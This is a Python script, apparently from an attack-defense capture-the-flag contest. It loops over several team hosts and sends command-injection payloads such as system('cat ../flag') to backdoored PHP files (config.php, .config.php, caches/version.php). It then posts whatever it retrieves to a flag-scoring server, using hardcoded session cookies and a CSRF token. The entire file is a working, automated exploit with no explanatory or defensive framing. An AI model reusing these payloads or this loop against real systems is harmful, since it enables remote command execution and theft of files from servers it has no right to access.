import requests
import time

cookies = {
    'csrftoken': 'yw4zpeIpVvH0v6LOIjoOtS1DPR6AfZH1',
    'sessionid': '0oi74hcpy97363ss9vzz23z953mqxekp',
    'scusername': '%E6%80%BB%E8%B4%A6%E5%8F%B7',
    'scuserqx': '74%2C76%2C77%2C87%2C88%2C75%2C78%2C79%2C80%2C81%2C82%2C83%2C84%2C89%2Cen',
    'rid': '9fqbqkvk1vq9m8hl3ps0ouc222',
    'scuser': '144eca3cf34807662be949b81b0863a7',
}

headers = {
    'Host': '218.245.4.97:8080',
    'Cache-Control': 'max-age=0',
    'Origin': 'http://218.245.4.97:8080',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Referer': 'http://218.245.4.97:8080/submit_flag/defense',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7',
}


cookies3 = {
    'alipay_userid_admin': '0',
    'alipay_userid': '2',
    'a': 'system',
}


data_post3 = {
  'b': 'cat ../../flag;'
}

while(1):
    for i in range(2,6):
        headers3 = {
            'Host': '218.245.4.97:{}8013'.format(i),
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:47.0) Gecko/20100101 Firefox/47.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,en-GB;q=0.9,zh-TW;q=0.7,zh;q=0.6,zh-HK;q=0.4,en-US;q=0.3,en;q=0.1',
            'DNT': '1',
        }
        web1 = "http://218.245.4.97:{}8011/config.php?x=system('cat ../flag');".format(i)
        web2 = "http://218.245.4.97:{}8012/.config.php?C=system(%22cat%20../flag%22);".format(i)
        web3 = "http://218.245.4.97:{}8013/caches/version.php".format(i)

        requests1 = requests.get(web1).text
        requests2 = requests.get(web2).text
        requests3 = requests.post(web3,data =data_post3,headers=headers3,cookies=cookies3)

        data1 = {
            'flag': requests1
        }
        data2 = {
            'flag': requests2
        }
        data3 = {
            'flag': requests3
        }

        post_url = 'http://218.245.4.97:8080/submit_flag/defense'
        response1 = requests.post(post_url, headers=headers, cookies=cookies,data=data1)
        response2 = requests.post(post_url, headers=headers, cookies=cookies,data=data2)
        response3 = requests.post(post_url, headers=headers, cookies=cookies,data=data3)
        if ("Your flag is true" in response1.text):
            print(str(i)+"==1:yes")
        if ("Your flag is true" in response2.text):
            print(str(i)+"==2:yes")
        if ("Your flag is true" in response3.text):
            print(str(i)+"==3:yes")
    time.sleep(300)